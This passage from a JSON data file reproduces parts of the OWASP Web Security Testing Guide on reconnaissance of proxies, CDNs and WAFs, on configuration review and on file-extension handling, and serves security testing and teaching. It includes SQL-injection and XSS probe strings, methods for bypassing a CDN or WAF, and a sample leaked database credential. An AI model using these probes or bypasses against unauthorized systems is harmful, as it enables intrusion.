aWWW-Authenticate: NTLMHTTP headerMay be integrated into the web application in a formMay require the username to be entered in the “DOMAIN\\username” format, or may give a dropdown of available domains</li><li>May use NTLM authentication, indicated by aWWW-Authenticate: NTLMHTTP header</li><li>May be integrated into the web application in a form</li><li>May require the username to be entered in the “DOMAIN\\username” format, or may give a dropdown of available domains</li><li>Single Sign-On (SSO) with either an internal or external providerTypically uses OAuth, OpenID Connect, or SAML</li><li>Typically uses OAuth, OpenID Connect, or SAML</li></ul><ul><li>Usually shows up as HTTP Basic authentication, indicated by a pop-up in the browser and aWWW-Authenticate: BasicHTTP header</li></ul><ul><li>Usually integrated into a form or API endpoint on the application</li></ul><ul><li>May use NTLM authentication, indicated by aWWW-Authenticate: NTLMHTTP header</li><li>May be integrated into the web application in a form</li><li>May require the username to be entered in the “DOMAIN\\username” format, or may give a dropdown of available domains</li></ul><ul><li>Typically uses OAuth, OpenID Connect, or SAML</li></ul><p>Applications may provide multiple options for the user to authenticate (such as registering a local account, or using their existing Facebook account), and may use different mechanisms for normal users and administrators.</p><p>Almost all web applications include third party resources that are loaded or that the client interacts with. These can include:</p><ul><li>Active content(such as scripts, style sheets, fonts, and iframes)</li><li>Passive content(such as images and videos)</li><li>External APIs</li><li>Social media buttons</li><li>Advertising networks</li><li>Payment gateways</li></ul><p>These resources are requested directly by the user’s browser, making them easier to identify using the developer tools, or an intercepting proxy. While it is important to identify them (as they can impact the security of the application), remember that they are usually out-of-scope for testing , as they belong to third parties.</p><p>A reverse proxy sits in front of one or more backend servers and redirects requests to the appropriate destination. They can be used to implement various functionality, such as:</p><ul><li>Acting as aload balancerorweb application firewall</li><li>Allowing multiple applications to be hosted on a single IP address or domain (in subfolders)</li><li>Implementing IP filtering or other restrictions</li><li>Caching content from the backend to improve performance</li></ul><p>It is not always possible to detect a reverse proxy (especially if there is only a single application behind it), but you can sometimes identify it by:</p><ul><li>A mismatch between the frontend server and the backend application (such as aServer: nginxheader with an ASP.NET application)This can sometimes lead torequest smuggling vulnerabilities</li><li>This can sometimes lead torequest smuggling vulnerabilities</li><li>Duplicate headers (especially theServerheader)</li><li>Multiple applications hosted on the same IP address or domain (especially if they use different languages)</li></ul><ul><li>This can sometimes lead torequest smuggling vulnerabilities</li></ul><p>A load balancer sits in front of multiple backend servers and allocates requests between them in order to provide greater redundancy and processing capacity for the application.</p><p>Load balancers can be difficult to detect, but can sometimes be identified by making multiple requests and examining the responses for differences, such as:</p><ul><li>Inconsistent system times</li><li>Different internal IP addresses or hostnames in detailed error messages</li><li>Different addresses returned fromServer-Side Request Forgery (SSRF)</li></ul><p>They may also be indicated by the presence of specific cookies (for example, F5 BIG-IP load balancers will create a cookie called BIGipServer .</p><p>A Content Delivery Network (CDN) is a geographically distributed set of caching proxy servers designed to improve site performance.</p><p>It is typically configured by pointing the publicly facing domain to the CDN’s servers, and then configuring the CDN to connect to the correct backend servers (sometimes known as the “origin”).</p><p>The easiest way to detect a CDN is to perform a WHOIS lookup for the IP addresses that the domain resolves to. If they belong to a CDN company (such as Akamai, Cloudflare or Fastly - see Wikipedia for a more complete list), it is then likely that a CDN is in use.</p><p>When testing a site behind a CDN, you should bear in mind the following points:</p><ul><li>The IP addresses and servers belong to the CDN provider, and are likely to be out-of-scope for infrastructure testing</li><li>Many CDNs also include features such as bot detection, rate limiting, and web application firewalls</li><li>CDNs usually cache content. Therefore, changes made in the backend may not appear immediately on the site.</li></ul><p>If the site is behind a CDN, it could be useful to identify the backend servers. If proper access control is not enforced, the tester may be able to bypass the CDN (and any protections it offers) by directly accessing the backend servers. There are a variety of different methods that may allow one to identify the backend system:</p><ul><li>Emails sent by the application may come direct from the backend server, which could reveal it’s IP address</li><li>DNS grinding, zone transfers or certificate transparency lists for a domain may reveal it on a subdomain</li><li>Scanning the IP ranges known to be used by the company may help identify the backend server</li><li>ExploitingServer-Side Request Forgery (SSRF)may reveal the IP address</li><li>Detailed error messages from the application may expose IP addresses or hostnames</li></ul><p>Most web servers will be protected by a packet filtering or stateful inspection firewall, which blocks any network traffic that is not required. To detect this, perform a port scan of the server and examine the results.</p><p>If the majority of the ports are shown as “closed” (i.e, they return a RST packet in response to the initial SYN packet), this suggests that the server may not be protected by a firewall. If the ports are shown as “filtered” (i.e, no response is received when sending a SYN packet to an unused port), then a firewall is most likely to be in place.</p><p>Additionally, if inappropriate services are exposed to the world (such as SMTP, IMAP, MySQL, etc), this suggests that either there is no firewall in place, or that the firewall is badly configured.</p><p>A network Intrusion Detection System (IDS) is designed to detect suspicious or malicious network-level activity, such as port or vulnerability scanning, and raise alerts. An Intrusion Prevention System (IPS) functions similarly, but also takes action to prevent the activity, usually by blocking the source IP address.</p><p>An IPS can usually be detected by running automated scanning tools (such as a port scanner) against the target, and seeing if the source IP is blocked. However, many application-level tools may not be detected by an IPS (especially if it doesn’t decrypt TLS).</p><p>A Web Application Firewall (WAF) inspects the contents of HTTP requests and blocks those that appear to be suspicious or malicious. They can also be used to dynamically apply other controls such as CAPTCHA or rate limiting. They usually utilize a set of known bad signatures and regular expressions, such as the OWASP Core Rule Set , to identify malicious traffic. WAFs can be effective at protecting against certain types of attacks such as SQL injection or cross-site scripting, but are less effective against other types such as access control or business logic related issues.</p><p>A WAF can be deployed in multiple locations, including:</p><ul><li>On the web server itself</li><li>On a separate virtual machine or hardware appliance</li><li>In the cloud, in front of the backend server</li></ul><p>Because a WAF blocks malicious requests, it can be detected by adding common attack strings to parameters and observing whether or not they are blocked. For example, try adding a parameter called foo with a value such as ' UNION SELECT 1 or ><script>alert(1)</script> . If these requests are blocked, it is likely that there may be a WAF in place. Additionally, the contents of the block pages may provide information about the specific technology that is in use. Finally, some WAFs may add cookies or HTTP headers to responses that can reveal their presence.</p><p>If a cloud-based WAF is in use, then it may be possible to bypass it by directly accessing the backend server, using the same methods discussed in the Content Delivery Network section.</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-01": {
        "summary": "<h3>Summary</h3><p>The intrinsic complexity of interconnected and heterogeneous web server infrastructure, which can include hundreds of web applications, makes configuration management and review a fundamental step in testing and deploying every single application. It takes only a single vulnerability to undermine the security of the entire infrastructure, and even small and seemingly unimportant problems may evolve into severe risks for another application on the same server. In order to address these problems, it is of utmost importance to perform an in-depth review of configuration and known security issues, after having mapped the entire architecture.</p><p>Proper configuration management of the web server infrastructure is very important in order to preserve the security of the application itself. If elements such as the web server software, the backend database servers, or the authentication servers are not properly reviewed and secured, they might introduce undesired risks or introduce new vulnerabilities that might compromise the application itself.</p><p>For example, a web server vulnerability that would allow a remote attacker to disclose the source code of the application itself (a vulnerability that has arisen a number of times in both web servers and application servers) could compromise the application, as anonymous users could use the information disclosed in the source code to leverage attacks against the application or its users.</p><p>The following steps need to be taken to test the configuration management infrastructure:</p><ul><li>The different elements that make up the infrastructure need to be determined in order to understand how they interact with a web application and how they affect its security.</li><li>All the elements of the infrastructure need to be reviewed in order to make sure that they don’t contain any known vulnerabilities.</li><li>A review needs to be made of the administrative tools used to maintain all the different elements.</li><li>The authentication systems need to be reviewed in order to assure that they serve the needs of the application and that they cannot be manipulated by external users to leverage access.</li><li>A list of defined ports which are required for the application should be maintained and kept under change control.</li></ul><p>After having mapped the different elements that make up the infrastructure (see Map Network and Application Architecture ), it is possible to review the configuration of each element founded and test for any known vulnerabilities.</p><h3>Test Objectives</h3><ul><li>Review the applications’ configurations set across the network and validate that they are not vulnerable.</li><li>Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Vulnerabilities in various areas of the application architecture, whether in the web server or the backend database, can severely compromise the application. For example, consider a server vulnerability that allows a remote, unauthenticated user to upload files to the web server or even replace existing files. This vulnerability could compromise the application, since a rogue user may be able to replace the application itself or introduce code that would affect the backend servers, as its application code would be run just like any other application.</p><p>Reviewing server vulnerabilities can be hard to do if the test needs to be done through a blind penetration test. In these cases, vulnerabilities need to be tested from a remote site, typically using an automated tool. However, testing for some vulnerabilities can have unpredictable results on the web server, and testing for others (like those directly involved in denial of service attacks) might not be possible due to the service downtime involved if the test was successful.</p><p>Some automated tools will flag vulnerabilities depending on the version of the web server they retrieve. This leads to both false positives and false negatives. On one hand, if the web server version has been removed or obscured by the local site administrator the scan tool will not flag the server as vulnerable even if it is. On the other hand, if the vendor providing the software does not update the web server version when vulnerabilities are fixed, the scan tool will flag vulnerabilities that do not exist. The latter case is actually very common as some operating system vendors back port patches of security vulnerabilities to the software they provide in the operating system, but do not do a full upload to the latest software version. This happens in most GNU/Linux distributions such as Debian, Red Hat, and SuSE. In most cases, vulnerability scanning of an application architecture will only find vulnerabilities associated with the “exposed” elements of the architecture (such as the web server) and will usually be unable to find vulnerabilities associated to elements which are not directly exposed, such as the authentication backend, the backend database, or reverse proxies [1] in use.</p><p>Finally, not all software vendors publicly disclose vulnerabilities, which means these weaknesses may not be registered within known vulnerability databases [2]. This information is only disclosed to customers or published through fixes that do not have accompanying advisories. This reduces the effectiveness of vulnerability scanning tools. Typically, vulnerability coverage of these tools will be very good for common products (such as the Apache web server, Microsoft IIS, or IBM’s Lotus Domino) but will be lacking for lesser known products.</p><p>This is why reviewing vulnerabilities is best done when the tester is provided with internal information about the software, including versions, releases, and patches applied. With this information, the tester can retrieve data from the vendor and analyze potential vulnerabilities in the architecture, as well as their potential impact on the application. When possible, these vulnerabilities can be tested to determine their real effects and to detect if there might be any external elements (such as intrusion detection or prevention systems) that might reduce or negate the possibility of successful exploitation. Testers might even determine through a configuration review that the vulnerability is not actually present since it affects a software component that is not in use.</p><p>It is also worthwhile to note that vendors will sometimes silently fix vulnerabilities and make the fixes available with new software releases. Different vendors have varying release cycles that determine the support they may provide for older releases. A tester with detailed information about the software versions used by the architecture can analyse the risk associated with the use of old software releases that might be unsupported in the short term or are already unsupported. This is critical because if a vulnerability emerges in an unsupported older software version, the systems personnel may not be directly aware of it. No patches will be ever made available for it and advisories might not list that version as vulnerable as it is no longer supported. Even if they are aware of the vulnerability and the associated system risks, a full upgrade to a new software release will be necessary, potentially introducing significant downtime in the application architecture or necessitating application re-coding due to incompatibilities with the latest software version.</p><p>Any web server infrastructure requires the existence of administrative tools to maintain and update the information used by the application. This information includes static content (web pages, graphic files), application source code, user authentication databases, etc. The type of administrative tools used can vary depending on the specific site, technology, or software in use. For example, some web servers will be managed using administrative interfaces which are themselves web servers (such as the iPlanet web server) or will be administrated by plain text configuration files (such as in the Apache case [3]) or use operating-system GUI tools (such as when using Microsoft’s IIS server or ASP.Net).</p><p>In most cases, the server configuration is managed with various file maintenance tools, administered through FTP servers, WebDAV, network file systems (NFS, CIFS), or other mechanisms. Obviously, the operating system of the elements that make up the application architecture will also be managed using other tools. Applications may also contain embedded administrative interfaces for managing application data (users, content, etc.).</p><p>After mapping the administrative interfaces used to manage different parts of the architecture, it is important to review them. If an attacker gains access to any of these interfaces, they could potentially compromise or damage the application architecture. To accomplish this, it’s important to:</p><ul><li>Determine the mechanisms that control access to these interfaces and their associated susceptibilities. This information may be available online.</li><li>Ensure that the default username and password are changed.</li></ul><p>Some companies choose not to manage all aspects of their web server applications and may delegate content management to other parties. This external company might provide only certain parts of the content (such as news updates or promotions), or it might completely manage the web server (including content and code). It is common to find administrative interfaces available from the internet in these situations, since using the internet is cheaper than providing a dedicated line that will connect the external company to the application infrastructure through a management-only interface. In such situations, it’s crucial to test whether the administrative interfaces are vulnerable to attacks.</p><h3>References</h3><ul><li>[1] WebSEAL, also known as Tivoli Authentication Manager, is a reverse proxy from IBM which is part of the Tivoli framework.</li><li>[2] Such as Symantec’s Bugtraq, ISS’ X-Force, or NIST’s National Vulnerability Database (NVD).</li><li>[3] There are some GUI-based administration tools for Apache (like NetLoony) but they are not in widespread use yet.</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-02": {
        "summary": "<h3>Summary</h3><p>Proper configuration of the single elements that make up an application architecture is important in order to prevent mistakes that might compromise the security of the whole architecture.</p><p>Reviewing and testing configurations are critical tasks in creating and maintaining an architecture. This is because various systems often come with generic configurations, which may not align well with the tasks they’re supposed to perform on the specific sites where they’re installed.</p><p>While the typical web and application server installation will contain a lot of functionality (like application examples, documentation, test pages), what is not essential should be removed before deployment to avoid post-install exploitation.</p><h3>Test Objectives</h3><ul><li>Ensure that default and known files have been removed.</li><li>Validate that no debugging code or extensions are left in the production environments.</li><li>Review the logging mechanisms set in place for the application.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In a default installation, many web servers and application servers provide sample applications and files for the benefit of the developer, in order to test if the server is working properly right after installation. However, many default web server applications have later been known to be vulnerable. This was the case, for example, for CVE-1999-0449 (Denial of Service in IIS when the Exair sample site had been installed), CAN-2002-1744 (Directory traversal vulnerability in CodeBrws.asp in Microsoft IIS 5.0), CAN-2002-1630 (Use of sendmail.jsp in Oracle 9iAS), or CAN-2003-1172 (Directory traversal in the view-source sample in Apache’s Cocoon).</p><p>CGI scanners, which include a detailed list of known files and directory samples provided by different web or application servers, might be a fast way to determine if these files are present. However, the only way to be really sure is to do a full review of the contents of the web server or application server, and determine whether they are related to the application itself or not.</p><p>It is very common for programmers to add comments when developing large web-based applications. However, comments included inline in HTML code might reveal internal information that should not be available to an attacker. Sometimes, a part of the source code is commented out when a functionality is no longer required, but this comment is unintentionally leaked out to the HTML pages returned to the users.</p><p>Comment review should be done in order to determine if any information is being leaked through comments. This review can only be thoroughly done through an analysis of the web server’s static and dynamic content, and through file searches. It can be useful to browse the site in an automatic or guided fashion, and store all the retrieved content. This retrieved content can then be searched in order to analyse any HTML comments available in the code.</p><p>Various tools, documents, or checklists can be used to give IT and security professionals a detailed assessment of the target systems’ conformance to various configuration baselines or benchmarks. Such tools include, but are not limited to, the following:</p><ul><li>CIS-CAT Lite</li><li>Microsoft’s Attack Surface Analyzer</li><li>NIST’s National Checklist Program</li></ul><p>The web server or application server configuration takes an important role in protecting the contents of the site and it must be carefully reviewed in order to spot common configuration mistakes. Obviously, the recommended configuration varies depending on the site policy, and the functionality that should be provided by the server software. In most cases, however, configuration guidelines (either provided by the software vendor or external parties) should be followed to determine if the server has been properly secured.</p><p>It is impossible to generically say how a server should be configured, however, some common guidelines should be taken into account:</p><ul><li>Only enable server modules (ISAPI extensions in the case of IIS) that are needed for the application. This reduces the attack surface since the server is reduced in size and complexity as software modules are disabled. It also prevents vulnerabilities that might appear in the vendor software from affecting the site if they are only present in modules that have been already disabled.</li><li>Handle server errors (40x or 50x) with custom-made pages instead of with the default web server pages. Specifically make sure that any application errors will not be returned to the end user and that no code is leaked through these errors since it will help an attacker. It is actually very common to forget this point since developers do need this information in pre-production environments.</li><li>Make sure that the server software runs with minimized privileges in the operating system. This prevents an error in the server software from directly compromising the whole system, although an attacker could elevate privileges once running code as the web server.</li><li>Make sure the server software properly logs both legitimate access and errors.</li><li>Make sure that the server is configured to properly handle overloads and prevent Denial of Service attacks. Ensure that the server has been performance-tuned properly.</li><li>Never grant non-administrative identities (with the exception ofNT SERVICE\\WMSvc) access to applicationHost.config, redirection.config, and administration.config (either Read or Write access). This includesNetwork Service,IIS_IUSRS,IUSR, or any custom identity used by IIS application pools. IIS worker processes are not meant to access any of these files directly.</li><li>Never share out applicationHost.config, redirection.config, and administration.config on the network. When using Shared Configuration, prefer to export applicationHost.config to another location (see the section titled “Setting Permissions for Shared Configuration).</li><li>Keep in mind that all users can read .NET Frameworkmachine.configand rootweb.configfiles by default. Do not store sensitive information in these files if it should be for administrator eyes only.</li><li>Encrypt sensitive information that should be read by the IIS worker processes only and not by other users on the machine.</li><li>Do not grant Write access to the identity that the Web server uses to access the sharedapplicationHost.config. This identity should have only Read access.</li><li>Use a separate identity to publish applicationHost.config to the share. Do not use this identity for configuring access to the shared configuration on the Web servers.</li><li>Use a strong password when exporting the encryption keys for use with shared -configuration.</li><li>Maintain restricted access to the share containing the shared configuration and encryption keys. If this share is compromised, an attacker will be able to read and write any IIS configuration for your Web servers, redirect traffic from your site to malicious sources, and in some cases gain control of all web servers by loading arbitrary code into IIS worker processes.</li><li>Consider protecting this share with firewall rules and IPsec policies to allow only the member web servers to connect.</li></ul><p>Logging is an important asset of the security of an application architecture, since it can be used to detect flaws in applications (users constantly trying to retrieve a file that does not really exist) as well as sustained attacks from rogue users. Logs are typically properly generated by web and other server software. It is not common to find applications that properly log their actions to a log and, when they do, the main intention of the application logs is to produce debugging output that could be used by the programmer to analyze a particular error.</p><p>In both cases (server and application logs) several issues should be tested and analyzed based on the log contents:</p><p>Some applications might, for example, use GET requests to forward form data which can be seen in the server logs. This means that server logs might contain sensitive information (such as usernames and passwords, or bank account details). This sensitive information can be misused by an attacker if they obtained the logs, for example, through administrative interfaces or known web server vulnerabilities or misconfiguration (like the well-known server-status misconfiguration in Apache-based HTTP servers).</p><p>Event logs will often contain data that is useful to an attacker (information leakage) or can be used directly in exploits:</p><ul><li>Debug information</li><li>Stack traces</li><li>Usernames</li><li>System component names</li><li>Internal IP addresses</li><li>Less sensitive personal data (e.g. email addresses, postal addresses and telephone numbers associated with named individuals)</li><li>Business data</li></ul><p>Also, in some jurisdictions, storing some sensitive information in log files, such as personal data, might oblige the enterprise to apply the data protection laws that they would apply to their backend databases to log files too. And failure to do so, even unknowingly, might carry penalties under the data protection laws that apply.</p><p>A wider list of sensitive information is:</p><ul><li>Application source code</li><li>Session identification values</li><li>Access tokens</li><li>Sensitive personal data and some forms of personally identifiable information (PII)</li><li>Authentication passwords</li><li>Database connection strings</li><li>Encryption keys</li><li>Bank account or payment card holder data</li><li>Data of a higher security classification than the logging system is allowed to store</li><li>Commercially-sensitive information</li><li>Information it is illegal to collect in the relevant jurisdiction</li><li>Information a user has opted out of collection, or not consented to e.g. use of do not track, or where consent to collect has expired</li></ul><p>Typically servers will generate local logs of their actions and errors, consuming the disk of the system the server is running on. However, if the server is compromised, its logs can be wiped out by the intruder to clean up all the traces of its attack and methods. If this were to happen the system administrator would have no knowledge of how the attack occurred or where the attack source was located. Actually, most attacker tool kits include a “log zapper” that is capable of cleaning up any logs that hold given information (like the IP address of the attacker) and are routinely used in attacker’s system-level root kits.</p><p>Therefore, it is wise to keep logs in a separate location and not on the web server itself. This also makes it easier to aggregate logs from different sources that refer to the same application (such as those of a web server farm) and it also makes it easier to do log analysis (which can be CPU intensive) without affecting the server itself.</p><p>Improper storage of logs can introduce a Denial of Service condition. Any attacker with sufficient resources might be able to produce a sufficient number of requests that would fill up the allocated space to log files, if they are not specifically prevented from doing so. However, if the server is not properly configured, the log files will be stored in the same disk partition as the one used for the operating system software or the application itself. This means that if the disk becomes filled, the operating system or the application might fail due to the inability to write on the disk.</p><p>Typically in UNIX systems logs will be located in /var (although some server installations might reside in /opt or /usr/local) and it is important to make sure that the directories in which logs are stored are in a separate partition. In some cases, and in order to prevent the system logs from being affected, the log directory of the server software itself (such as /var/log/apache in the Apache web server) should be stored in a dedicated partition.</p><p>This is not to say that logs should be allowed to grow to fill up the file system they reside in. Growth of server logs should be monitored in order to detect this condition since it may be indicative of an attack.</p><p>Testing this condition, which can be risky in production environments, can be done by firing off a sufficient and sustained number of requests to see if these requests are logged and if there’s a possibility to fill up the log partition through these requests. In some environments where QUERY_STRING parameters are also logged regardless of whether they are produced through GET or POST requests, big queries can be simulated that will fill up the logs faster since, typically, a single request will cause only a small amount of data to be logged, such as date and time, source IP address, URI request, and server result.</p><p>Most servers (but few custom applications) will rotate logs in order to prevent them from filling up the file system they reside on. The assumption during log rotation is that the information within them is only necessary for a limited duration.</p><p>This feature should be tested in order to ensure that:</p><ul><li>Logs are kept for the time defined in the security policy, not more and not less.</li><li>Logs are compressed once rotated (this is a convenience, since it will mean that more logs will be stored for the same available disk space).</li><li>File system permissions for rotated log files should be the same as (or stricter than) those for the log files themselves. For example, web servers will need to write to the logs they use but they don’t actually need to write to rotated logs, which means that the permissions of the files can be changed upon rotation to prevent the web server process from modifying these.</li></ul><p>Some servers might rotate logs when they reach a given size. If this happens, it must be ensured that an attacker cannot force logs to rotate in order to hide his tracks.</p><p>Event log information should never be visible to end users. Even web administrators should not have access to such logs as it breaches separation of duty controls. Ensure that any access control schema that is used to protect access to raw logs, and any application providing capabilities to view or search the logs are not linked with access control schemas for other application user roles. Neither should any log data be visible to unauthenticated users.</p><p>Reviewing logs can be used not only for extracting usage statistics of files in web servers (which is typically what most log-based applications focus on) but also for determining if attacks are occurring on the web server.</p><p>In order to analyze web server attacks, the error log files of the server need to be analyzed. Review should concentrate on:</p><ul><li>40x (not found) error messages. A large amount of these from the same source might be indicative of a CGI scanner tool being used against the web server</li><li>50x (server error) messages. These can be an indication of an attacker abusing parts of the application which fail unexpectedly. For example, the first phases of a SQL injection attack will produce these error message when the SQL query is not properly constructed and its execution fails on the backend database.</li></ul><p>Log statistics or analysis should not be generated or stored in the same server that produces the logs. Otherwise, an attacker might, through a web server vulnerability or improper configuration, gain access to them and retrieve similar information as would be disclosed by log files themselves.</p><h3>References</h3><ul><li>ApacheApache Security, by Ivan Ristic, O’reilly, March 2005.Apache Security Secrets: Revealed (Again), Mark Cox, November 2003Apache Security Secrets: Revealed, ApacheCon 2002, Las Vegas, Mark J Cox, October 2002Performance Tuning</li><li>Apache Security, by Ivan Ristic, O’reilly, March 2005.</li><li>Apache Security Secrets: Revealed (Again), Mark Cox, November 2003</li><li>Apache Security Secrets: Revealed, ApacheCon 2002, Las Vegas, Mark J Cox, October 2002</li><li>Performance Tuning</li><li>Lotus DominoLotus Security Handbook, William Tworek et al., April 2004, available in the IBM Redbooks collectionLotus Domino Security, an X-force white-paper, Internet Security Systems, December 2002Hackproofing Lotus Domino Web Server, David Litchfield, October 2001</li><li>Lotus Security Handbook, William Tworek et al., April 2004, available in the IBM Redbooks collection</li><li>Lotus Domino Security, an X-force white-paper, Internet Security Systems, December 2002</li><li>Hackproofing Lotus Domino Web Server, David Litchfield, October 2001</li><li>Microsoft IISSecurity Best Practices for IIS 8CIS Microsoft IIS BenchmarksSecuring Your Web Server (Patterns and Practices), Microsoft Corporation, January 2004IIS Security and Programming Countermeasures, by Jason CoombsFrom Blueprint to Fortress: A Guide to Securing IIS 5.0, by John Davis, Microsoft Corporation, June 2001Secure IIS 5 Checklist, by Michael Howard, Microsoft Corporation, June 2000</li><li>Security Best Practices for IIS 8</li><li>CIS Microsoft IIS Benchmarks</li><li>Securing Your Web Server (Patterns and Practices), Microsoft Corporation, January 2004</li><li>IIS Security and Programming Countermeasures, by Jason Coombs</li><li>From Blueprint to Fortress: A Guide to Securing IIS 5.0, by John Davis, Microsoft Corporation, June 2001</li><li>Secure IIS 5 Checklist, by Michael Howard, Microsoft Corporation, June 2000</li><li>Red Hat’s (formerly Netscape’s) iPlanetGuide to the Secure Configuration and Administration of iPlanet Web Server, Enterprise Edition 4.1, by James M Hayes, The Network Applications Team of the Systems and Network Attack Center (SNAC), NSA, January 2001</li><li>Guide to the Secure Configuration and Administration of iPlanet Web Server, Enterprise Edition 4.1, by James M Hayes, The Network Applications Team of the Systems and Network Attack Center (SNAC), NSA, January 2001</li><li>WebSphereIBM WebSphere V5.0 Security, WebSphere Handbook Series, by Peter Kovari et al., IBM, December 2002.IBM WebSphere V4.0 Advanced Edition Security, by Peter Kovari et al., IBM, March 2002.</li><li>IBM WebSphere V5.0 Security, WebSphere Handbook Series, by Peter Kovari et al., IBM, December 2002.</li><li>IBM WebSphere V4.0 Advanced Edition Security, by Peter Kovari et al., IBM, March 2002.</li><li>GeneralLogging Cheat Sheet, OWASPSP 800-92Guide to Computer Security Log Management, NISTPCI DSS v3.2.1Requirement 10 and PA-DSS v3.2 Requirement 4, PCI Security Standards Council</li><li>Logging Cheat Sheet, OWASP</li><li>SP 800-92Guide to Computer Security Log Management, NIST</li><li>PCI DSS v3.2.1Requirement 10 and PA-DSS v3.2 Requirement 4, PCI Security Standards Council</li><li>Generic:CERT Security Improvement Modules: Securing Public Web Servers</li><li>CERT Security Improvement Modules: Securing Public Web Servers</li></ul><ul><li>Apache Security, by Ivan Ristic, O’reilly, March 2005.</li><li>Apache Security Secrets: Revealed (Again), Mark Cox, November 2003</li><li>Apache Security Secrets: Revealed, ApacheCon 2002, Las Vegas, Mark J Cox, October 2002</li><li>Performance Tuning</li></ul><ul><li>Lotus Security Handbook, William Tworek et al., April 2004, available in the IBM Redbooks collection</li><li>Lotus Domino Security, an X-force white-paper, Internet Security Systems, December 2002</li><li>Hackproofing Lotus Domino Web Server, David Litchfield, October 2001</li></ul><ul><li>Security Best Practices for IIS 8</li><li>CIS Microsoft IIS Benchmarks</li><li>Securing Your Web Server (Patterns and Practices), Microsoft Corporation, January 2004</li><li>IIS Security and Programming Countermeasures, by Jason Coombs</li><li>From Blueprint to Fortress: A Guide to Securing IIS 5.0, by John Davis, Microsoft Corporation, June 2001</li><li>Secure IIS 5 Checklist, by Michael Howard, Microsoft Corporation, June 2000</li></ul><ul><li>Guide to the Secure Configuration and Administration of iPlanet Web Server, Enterprise Edition 4.1, by James M Hayes, The Network Applications Team of the Systems and Network Attack Center (SNAC), NSA, January 2001</li></ul><ul><li>IBM WebSphere V5.0 Security, WebSphere Handbook Series, by Peter Kovari et al., IBM, December 2002.</li><li>IBM WebSphere V4.0 Advanced Edition Security, by Peter Kovari et al., IBM, March 2002.</li></ul><ul><li>Logging Cheat Sheet, OWASP</li><li>SP 800-92Guide to Computer Security Log Management, NIST</li><li>PCI DSS v3.2.1Requirement 10 and PA-DSS v3.2 Requirement 4, PCI Security Standards Council</li></ul><ul><li>CERT Security Improvement Modules: Securing Public Web Servers</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-03": {
        "summary": "<h3>Summary</h3><p>Web servers commonly use file extensions to determine which technologies, languages, and plugins must be used to fulfill web requests. While this behavior is consistent with RFCs and Web Standards, using standard file extensions provides the penetration tester useful information about the underlying technologies used in a web appliance and greatly simplifies the task of determining the attack scenario to be used on particular technologies. In addition, mis-configuration of web servers could easily reveal confidential information about access credentials.</p><p>File extension checks are often done to validate files before uploading them to the server. Unrestricted file uploads can lead to unforeseen results because the content may not be what is expected, or due to unexpected OS filename handling.</p><p>Understanding how web servers handle requests for files with different extensions can clarify server behavior based on the types of files accessed. For example, it can help to understand which file extensions are returned as text or plain versus those that cause server-side execution. The latter are indicative of technologies, languages, or plugins used by web servers or application servers. This information may provide additional insight into how the web application is engineered. For example, while a “.pl” extension is typically associated with server-side Perl support, the file extension alone can be misleading and not entirely indicative of the underlying technology. Take, for instance, server-side resources written in Perl, which might be renamed to disguise the usage of Perl. See the next section on “web server components” for more on identifying server-side technologies and components.</p><h3>Test Objectives</h3><ul><li>Brute force sensitive file extensions that might contain raw data such as scripts, credentials, etc.</li><li>Validate that no system framework bypasses exist for the rules that have been set</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Submit requests with different file extensions and verify how they are handled. The verification should be on a per web directory basis. Verify directories that allow script execution. Web server directories can be identified by scanning tools which look for the presence of well-known directories. Additionally, mirroring the site structure helps testers reconstruct the directory tree served by the application.</p><p>If the web application architecture is load-balanced, it is important to assess all of the web servers. The ease of this task depends on the configuration of the balancing infrastructure. In an infrastructure with redundant components, there may be slight variations in the configuration of individual web or application servers. This may happen if the web architecture employs heterogeneous technologies (think of a set of IIS and Apache web servers in a load-balancing configuration, which may introduce slight asymmetric behavior between them, and possibly different vulnerabilities).</p><p>The tester has identified the existence of a file named connection.inc . Trying to access it directly gives back its contents, which are:</p><pre><code><? mysql_connect ( \"127.0.0.1\" , \"root\" , \"password\" ) or die ( \"Could not connect\" ); ?></code></pre><p>The tester determines the existence of a MySQL DBMS backend and the weak credentials used by the web application to access it.</p><p>The following file extensions should never be returned by a web server, as they pertain to files that could contain sensitive information or files that have no valid reason to be served.</p><ul><li>.asa</li><li>.inc</li><li>.config</li></ul><p>The following file extensions are related to files which, when accessed, are either displayed or downloaded by the browser. Therefore, files with these extensions must be checked to verify that they are indeed supposed to be served (and are not leftovers), and that they do not contain sensitive information.</p><ul><li>.zip,.tar,.gz,.tgz,.rar, etc.: (Compressed) archive files</li><li>.java: No reason to provide access to Java source files</li><li>.txt: Text files</li><li>.pdf: PDF documents</li><li>.docx,.rtf,.xlsx,.pptx, etc.: Office documents</li><li>.bak,.oldand other extensions indicative of backup files (for example:~for Emacs backup files)</li></ul><p>The list given above details only a few examples, since file extensions are too many to be comprehensively treated here. Refer to FILExt for a more thorough database of extensions.</p><p>To identify files with a given extension, a mix of techniques can be employed. These techniques can include using vulnerability scanners, spidering and mirroring tools, and querying search engines (see Testing: Spidering and googling ). Manual inspection of the application can also be beneficial, as it overcomes limitations in automatic spidering. See also Testing for Old, Backup and Unreferenced Files which deals with the security issues related to “forgotten” files.</p><p>Windows 8.3 legacy file handling can sometimes be used to defeat file upload filters.</p><p>Usage examples:</p><p>White-box testing of file extension handling involves checking the server configurations in the web application architecture and verifying the rules for serving different file extensions.</p><p>If the web application relies on a load-balanced, heterogeneous infrastructure, determine whether this may introduce different behavior.</p>",
        "tools": "<h3>Tools</h3><p>Vulnerability scanners, such as Nessus and Nikto, check for the existence of well-known web directories. They may allow the tester to download the site structure, which is helpful when trying to determine the configuration of web directories and how individual file extensions are served. Other tools that can be used for this purpose include:</p><ul><li>wget</li><li>curl</li><li>Perform a Google search for “web mirroring tools”</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-04": {
